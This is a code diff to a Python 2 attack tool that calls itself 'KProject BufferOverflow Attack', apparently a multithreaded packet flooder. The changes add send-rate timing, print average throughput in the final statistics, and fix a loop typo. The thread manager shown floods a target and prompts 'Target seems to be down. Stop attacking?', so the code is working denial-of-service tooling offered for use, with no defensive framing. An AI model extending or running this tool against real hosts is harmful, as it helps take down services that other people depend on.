@@ -6,8 +6,11 @@
 #   Coyright (c) 2016 by Nick Lauri.
 #
 
-import os, sys
-import socket, threading
+import os
+import sys
+import socket
+import threading
+import time
 from libs import kpstd
 
 class prog:
@@ -29,6 +32,7 @@ class packet:
 	data    = ''    # string of data (default: 'A')
 	ndata   = 0	    # number of clonning data
 	datalen = 0
+	veloc   = ''
 
 class error:
 	socket  = 0
@@ -128,6 +132,8 @@ def thread_manager(func, num, target_tuple_args, verbose=True):
 	- kwarg : (dict) args of function
 	"""
 	
+	time_start = time.time()
+	time_end   = False
 	try:
 		while True:
 			if len(threading.enumerate()) - 1 < num:
@@ -141,12 +147,13 @@ def thread_manager(func, num, target_tuple_args, verbose=True):
 					error.thread += 1
 		
 			if verbose:
-				kpstd.info("Thread active: %2d/%2d | sent: %d packets (%s) | error: %d:%d:%d:%d        \r" \
-					%(len(threading.enumerate()) -1, num, packet.sent, bytesformat(packet.datalen*packet.ndata*packet.sent),\
+				kpstd.info("Thread active: %2d/%2d | sent: %d packets (%s - %s/s) | error: %d:%d:%d:%d        \r" \
+					%(len(threading.enumerate()) -1, num, packet.sent, bytesformat(packet.datalen*packet.ndata*packet.sent), bytesformat(float(packet.sent*packet.datalen*packet.ndata)/(time.time() - time_start)),\
 					 error.send, error.thread, error.socket, error.connect))
 
 			if not target.is_alive:
 				#print ' '*80 + '\r'
+				time_end = time.time()
 				kpstd.info("\nTarget seems to be down. Stop attacking? (Y/n): ")
 				choice = raw_input()
 				if choice.lower() == 'n':
@@ -157,6 +164,9 @@ def thread_manager(func, num, target_tuple_args, verbose=True):
 					
 			
 	except KeyboardInterrupt:
+		if not time_end:
+			time_end = time.time()
+		packet.veloc = bytesformat(float(packet.sent*packet.datalen*packet.ndata)/(time_end - time_start))
 		print
 		kpstd.info('Quit? (Y/n): ')
 		choice = raw_input()
@@ -171,6 +181,9 @@ def thread_manager(func, num, target_tuple_args, verbose=True):
 			print 'OK'
 			return
 	except Exception:
+		if not time_end:
+			time_end = time.time()
+		packet.veloc = bytesformat(float(packet.sent*packet.datalen*packet.ndata)/(time_end - time_start))
 		print 
 		kpstd.info('Waiting for all threads stop: ')
 		main_thread = threading.current_thread()
@@ -179,13 +192,13 @@ def thread_manager(func, num, target_tuple_args, verbose=True):
 				thread.join()
 		print 'OK'
 		return
-#
+#####################
 
 def usage():
 	print("%s - KProject BufferOverflow Attack version %s" %(prog.name, prog.version))
 	print("Copyright (c) 2016 by Nick Lauri")
 	print usage_string %(prog.name)
-#
+#####################
 
 def main():
 	if len(sys.argv) == 1:
@@ -354,7 +367,7 @@ def main():
 	
 	if not packet.ndata:
 		_count = 1
-		while count*packet.datalen <= 1000:
+		while _count*packet.datalen <= 1000:
 			_count += 1
 		packet.ndata = _count
 		del _count
@@ -386,13 +399,14 @@ if __name__ == "__main__":
 		kpstd.error("Error: %s\n" %str(e))
 	
 	if packet.sent:
-		kpstd.info("Statictics:\n")
-		print("    - Packet sent   : %d" %packet.sent)
-		print("    - Total         : %s" %bytesformat(packet.sent*packet.datalen*packet.ndata))
-		print("    - Send errors   : %d" %error.send)
-		print("    - Thread errors : %d" %error.thread)
-		print("    - Socket errors : %d" %error.socket)
-		print("    - Connect errors: %d" %error.connect)
+		kpstd.info("Statistics:\n")
+		print("    - Packet sent   : %d"   %packet.sent)
+		print("    - Total         : %s"   %bytesformat(packet.sent*packet.datalen*packet.ndata))
+		print("    - avg_v         : %s/s" %packet.veloc)
+		print("    - Send errors   : %d"   %error.send)
+		print("    - Thread errors : %d"   %error.thread)
+		print("    - Socket errors : %d"   %error.socket)
+		print("    - Connect errors: %d"   %error.connect)
 	
 	kpstd.info("Exiting.\n")
 	
